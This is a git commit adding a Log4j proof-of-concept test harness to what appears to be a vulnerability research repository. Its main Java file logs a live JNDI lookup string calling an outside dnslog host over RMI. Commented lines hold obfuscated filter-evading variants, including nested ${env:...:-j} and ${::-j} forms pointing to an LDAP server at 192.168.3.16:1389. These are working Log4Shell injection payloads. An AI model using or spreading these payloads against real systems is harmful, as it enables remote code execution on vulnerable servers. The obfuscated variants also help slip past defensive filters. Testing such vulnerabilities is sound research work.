561d89d102b713821c0d776a1686d83f7ffbafab
bin4xin <1904829268@qq.com>
2021-12-27 10:19:01 +0800

    [2021/12/27/10:18:17]<添加::apache-log4j-poc相关调试代码> commit by bin4xin.
    Signed-off-by: bin4xin <1904829268@qq.com>

---
+++ CoVV/ApacheLog4j/apache-log4j-poc/src/main/java/Log4jRCE.java
@@ -0,0 +1,3 @@
+public class Log4jRCE {
+
+}
---
+++ CoVV/ApacheLog4j/apache-log4j-poc/src/main/java/log4j.java
@@ -0,0 +1,18 @@
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+public class log4j {
+
+    private static final Logger logger = LogManager.getLogger(log4j.class);
+    public static void main(String[] args) {
+//        logger.error("${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//192.168.3.16:1389/gkpbai}");
+
+/*
+ * ${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//192.168.3.16:1389/mpffmo}
+ * success log
+ */
+        logger.error("${jndi:rmi://6zxboi.dnslog.cn/ exp}");
+       // logger.error("${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://3qbuik.dnslog.cn/ 123}");
+       //logger.error("run success.");
+    }
+}
